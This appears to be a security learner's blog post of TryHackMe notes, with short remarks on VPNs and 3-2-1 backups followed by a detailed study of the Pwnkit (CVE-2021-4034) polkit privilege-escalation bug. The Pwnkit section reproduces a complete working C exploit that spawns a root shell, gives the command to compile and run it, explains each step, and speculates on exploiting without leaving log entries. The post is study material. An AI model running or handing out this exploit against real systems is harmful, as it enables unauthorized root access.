---
title: 'TryHackMe: Common Attacks &amp; Pwnkit'
date: 2022-02-03 12:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2022-02-03-tryhackme-common-attacks-and-pwnkit.html
author: 100007
---

# TryHackMe: Common Attacks & Pwnkit

**author:** Nathan Acks  
**date:** 2022-02-03

# Common Attacks

## Public Network Safety

I really do wish that guides like this would stop highlighting VPNs – their utility is just really unclear for most people anymore!

## Backups

“3, 2, 1” is a good mnemonic for backups:

- THREE or more copies
- TWO or more different storage devices
- ONE or more offsite backups

Though honestly, this is kind of a “minimum viable backup” strategy, since simply using a cloud service to mirror data between two devices would qualify! (Why? Working data counts as a copy…)

# Pwnkit (CVE-2021-4034)

## Exploitation

Quick-n-dirty Pwnkit exploit:

```
/*
* Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit's pkexec (CVE-2021-4034) by Andris Raugulis <moo@arthepsy.eu>
* Advisory: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *shell =
"#include <stdio.h>
"
"#include <stdlib.h>
"
"#include <unistd.h>
"
"void gconv() {}
"
"void gconv_init() {
"
" setuid(0); setgid(0);
"
" seteuid(0); setegid(0);
"
" system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");
"
" exit(0);
"
"}";
int main(int argc, char *argv[]) {
FILE *fp;
system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
fp = fopen("pwnkit/pwnkit.c", "w");
fprintf(fp, "%s", shell);
fclose(fp);
system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
execve("/usr/bin/pkexec", (char*[]){NULL}, env);
}
```

The exploit is then as simple as `gcc $FILE -o exploit; ./exploit`.

Here’s what basically happens on execution:

- The exploit creates the path `GCONV_PATH=.` in the current directory and adds an invalid executable file to it.
- The exploit creates a second directory called `pwnkit` and sets up a malicious shared library designed to be loaded by GLib to translate system messages to the made-up character set “PWNKIT”.
- The exploit calls `pkexec` with a NULL argument list (this bit is important, since we need the length of the argument list to be 0 – so, not even to contain the name of `pkexec` itself) _but_ with a correctly set up (albeit malicious) environment via `execve()`. Importantly, the first “variable” in the environment is actually the name of the (invalid) executable in the `GCONV_PATH=.` directory.
- Polkit just falls through the loop that it would normally use to walk through the passed-in arguments. This causes what would be pointing to an executable name to instead point to the first environment variable that’s passed into `execve()`, which happens to be string `pwnkit`.
- Polkit looks up the malicious executable, finds it in `GCONV_PATH=./pwnkit` (because we set the PATH to that directory), and then tries to replace the executable name with this full path. _Except_ that it’s still writing to the first element of the environment, which causes `pwnkit` to be replaced by `GCONV_PATH=./pwnkit`.
- Polkit the proceeds to sanitize its environment. When it comes to the invalid SHELL variable this sanitization fails and Polkit throws an error and dies. _But!_ Before dying, Polkit tries to _print_ the error using a GLib function that dutifully attempts to translate the message into the “PWNKIT” character set. To figure out how to do this, modules are loaded from GCONV\_PATH… And we’ve defined a malicious module to do this that cleans up the exploit files and spawns a root shell (since `pkexec` is SUID root).

This version of the exploit cleans up after itself, but does depend on generating a log message. The Qualsys advisory describing Pwnkit notes that “this vulnerability is also exploitable without leaving any traces in the logs, but this is left as an exercise for the interested reader.” My guess is that to do this you’d need to reintroduce a different environment variable that `ld.so` normally strips when calling SUID binaries. (At least, I don’t immediately see any place where Polkit is printing something that _isn’t_ a warning before it nukes its own environment, but then I’m not super-familiar with C and am only quickly skimming the `pkexec` source code.) _Or_ perhaps you can do something with the permissions of the `GCONV_PATH=./pwnkit` file to trigger an error that would not be logged. (The trick here would be to do something so that `g_find_program_in_path()` resolves `GCONV_PATH=./pwnkit` but `access()` returns an error; it’s not obvious to me how to do this though, or even if it _can_ be done!)

It took me a while to figure out why this exploit doesn’t occur when `pkexec` is called without any arguments, since it will still fall through the initial argument-parsing loop. The reason this doesn’t happen is that `argv[1]` is NULL in this case (the last element of `argv` is always the NULL pointer), so the first string of the environment isn’t wrongly loaded _and_ and entirely separate code path is triggered before the `GCONV_PATH=./pwnkit` variable would have gotten written into the environment. (It’s worth noting that Debian derivatives seem to have removed the `sudo -s` like functionality from `pkexec` entirely, and just display a help message in this case.)

- [arthepsy / CVE-2021-4034](https://github.com/arthepsy/CVE-2021-4034)
- [pwnkit: Local Privilege Escalation in polkit’s pkexec (CVE-2021-4034)](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)
- [polkit / src / programs / pkexec.c (commit 539bf5dc)](https://gitlab.freedesktop.org/polkit/polkit/-/blob/539bf5dcca489534f42798a4500aca4b1a8ec8d0/src/programs/pkexec.c)
